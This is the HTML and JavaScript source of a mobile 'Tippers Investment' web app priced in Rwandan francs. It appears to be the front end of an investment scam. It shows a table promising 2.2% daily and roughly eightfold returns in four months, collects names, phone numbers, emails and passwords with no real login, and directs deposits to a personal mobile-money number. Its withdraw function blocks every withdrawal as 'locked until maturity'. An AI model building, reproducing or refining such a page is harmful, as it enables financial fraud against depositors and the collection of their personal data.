<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Tippers Investment</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>
body{
margin:0;
font-family:Segoe UI;
background:#0b1120;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

.app{
width:380px;
background:#000;
border-radius:20px;
overflow:hidden;
color:white;
display:flex;
flex-direction:column;
}

.content{
padding:20px;
height:520px;
overflow-y:auto;
}

.title{color:#f59e0b;text-align:center;font-weight:bold;}
.desc{text-align:center;margin-top:10px;color:#ccc}

input,select{
width:100%;
padding:10px;
margin-top:8px;
border-radius:8px;
border:none;
background:#0f172a;
color:white;
}

button{
width:100%;
padding:12px;
margin-top:15px;
border:none;
border-radius:10px;
background:linear-gradient(135deg,#f59e0b,#f97316);
color:white;
font-weight:bold;
cursor:pointer;
}

.row{display:flex;gap:5px;}

.nav{
display:flex;
justify-content:space-around;
background:#020617;
padding:10px;
}

.nav div{text-align:center;cursor:pointer;}
.nav i{display:block;font-size:20px;margin-bottom:3px;}

#toast{
position:fixed;
bottom:20px;
left:50%;
transform:translateX(-50%);
background:red;
color:white;
padding:10px;
border-radius:8px;
display:none;
}

/* TABLE SCROLL FIX */
.tableWrap{
margin-top:15px;
background:#0f172a;
border-radius:12px;
overflow-x:auto;
white-space:nowrap;
}

table{
min-width:900px;
border-collapse:collapse;
font-size:12px;
}

th,td{
padding:8px;
text-align:center;
border:1px solid #1f2937;
}

th{
background:#111827;
color:#f59e0b;
}

/* CARD */
.card{
background:#111;
padding:15px;
border-radius:12px;
margin-top:10px;
}

.money{
background:#111;
padding:10px;
border-radius:10px;
text-align:center;
}

</style>
</head>

<body>

<div class="app">
<div class="content" id="screen"></div>

<div class="nav" id="nav" style="display:none">
<div onclick="home()"><i class="fa fa-home"></i>HOME</div>
<div onclick="deposit()"><i class="fa fa-wallet"></i>DEPOSIT</div>
<div onclick="earn()"><i class="fa fa-chart-line"></i>EARN</div>
<div onclick="withdraw()"><i class="fa fa-money-bill"></i>WITHDRAW</div>
</div>
</div>

<div id="toast"></div>

<script>

let users=[];
let depositDone=false;
let amount=0;
let selectedPeriod=0;

const screen=document.getElementById("screen");
const nav=document.getElementById("nav");

/* FORMAT MONEY */
function formatMoney(n){
return Number(n).toLocaleString("en-US")+" RWF";
}

/* TOAST */
function toast(m){
let t=document.getElementById("toast");
t.innerText=m;
t.style.display="block";
setTimeout(()=>t.style.display="none",2000);
}

/* START */
function start(){
screen.innerHTML=`
<h2 class="title">WELCOME TO TIPPERS INVESTMENT APP !</h2>
<p class="desc">Start smart investment journey</p>
<button onclick="register()">START</button>
`;
}

/* REGISTER simplified (unchanged core) */
function register(){
screen.innerHTML=`
<h3 class="title">REGISTER</h3>

<input id="f" placeholder="First name">
<input id="l" placeholder="Last name">

<select id="g">
<option value="">Gender</option>
<option>Male</option>
<option>Female</option>
</select>

<div class="row">
<select id="code">
<option>+250</option>
<option>+254</option>
</select>
<input id="phone" placeholder="Phone">
</div>

<input id="email" placeholder="Email">
<input id="pass" placeholder="6 digits password">
<input id="cpass" placeholder="Confirm password">

<button onclick="login()">REGISTER</button>
`;
}

/* LOGIN */
function login(){
nav.style.display="flex";
home();
}

/* HOME TABLE */
function home(){
screen.innerHTML=investmentTable();
}

/* TABLE FIXED + SCROLL */
function investmentTable(){
return `
<div class="tableWrap">
<table>
<tr>
<th>AMOUNT</th>
<th>2.2%</th>
<th>WEEK</th>
<th>MONTH</th>
<th>45D</th>
<th>3M</th>
<th>4M</th>
</tr>

<tr><td>${formatMoney(5000)}</td><td>${formatMoney(110)}</td><td>${formatMoney(1050)}</td><td>${formatMoney(5400)}</td><td>${formatMoney(9225)}</td><td>${formatMoney(22500)}</td><td>${formatMoney(42000)}</td></tr>

<tr><td>${formatMoney(50000)}</td><td>${formatMoney(1100)}</td><td>${formatMoney(10500)}</td><td>${formatMoney(54000)}</td><td>${formatMoney(92250)}</td><td>${formatMoney(225000)}</td><td>${formatMoney(420000)}</td></tr>

<tr><td>${formatMoney(100000)}</td><td>${formatMoney(2200)}</td><td>${formatMoney(21000)}</td><td>${formatMoney(108000)}</td><td>${formatMoney(184500)}</td><td>${formatMoney(450000)}</td><td>${formatMoney(840000)}</td></tr>

<tr><td>${formatMoney(150000)}</td><td>${formatMoney(3300)}</td><td>${formatMoney(31500)}</td><td>${formatMoney(162000)}</td><td>${formatMoney(276750)}</td><td>${formatMoney(675000)}</td><td>${formatMoney(1260000)}</td></tr>

<tr><td>${formatMoney(300000)}</td><td>${formatMoney(6600)}</td><td>${formatMoney(63000)}</td><td>${formatMoney(324000)}</td><td>${formatMoney(553500)}</td><td>${formatMoney(1350000)}</td><td>${formatMoney(2520000)}</td></tr>

<tr><td>${formatMoney(500000)}</td><td>${formatMoney(11000)}</td><td>${formatMoney(105000)}</td><td>${formatMoney(540000)}</td><td>${formatMoney(922500)}</td><td>${formatMoney(2250000)}</td><td>${formatMoney(4200000)}</td></tr>

<tr><td>${formatMoney(700000)}</td><td>${formatMoney(15400)}</td><td>${formatMoney(147000)}</td><td>${formatMoney(756000)}</td><td>${formatMoney(1291500)}</td><td>${formatMoney(3150000)}</td><td>${formatMoney(5880000)}</td></tr>

<tr><td>${formatMoney(1000000)}</td><td>${formatMoney(22000)}</td><td>${formatMoney(210000)}</td><td>${formatMoney(1080000)}</td><td>${formatMoney(1845000)}</td><td>${formatMoney(4500000)}</td><td>${formatMoney(8400000)}</td></tr>

</table>
</div>

<button onclick="deposit()">NEXT</button>
`;
}

/* DEPOSIT */
function deposit(){
screen.innerHTML=`
<h3 class="title">DEPOSIT</h3>

<input id="amt" placeholder="Amount">
<input id="sender" placeholder="Sender name">

<button onclick="payment()">CONTINUE</button>
`;
}

/* PAYMENT */
function payment(){
screen.innerHTML=`
<h3 class="title">PAYMENT INFO</h3>

<div class="card">
0795410739<br><br>BARAKA BOLINGO
</div>

<button onclick="dial()">DIAL & PAY</button>
`;
}

/* WITHDRAW (FIXED PHONE INPUT) */
function withdraw(){
screen.innerHTML=`
<h3 class="title">WITHDRAW</h3>

<input id="wamt" placeholder="Amount">

<input id="wphone" placeholder="MTN number (+250...)">

<button onclick="doWithdraw()">WITHDRAW</button>
`;
}

function doWithdraw(){
if(!wamt.value || !wphone.value){
toast("Fill all fields ❌");return;
}

if(!wphone.value.startsWith("+250")){
toast("Only MTN numbers allowed ❌");return;
}

if(parseInt(wamt.value)<7500){
toast("INVALID INPUT ❌");return;
}

toast("Withdraw locked until maturity");
}

start();

</script>

</body>
</html>
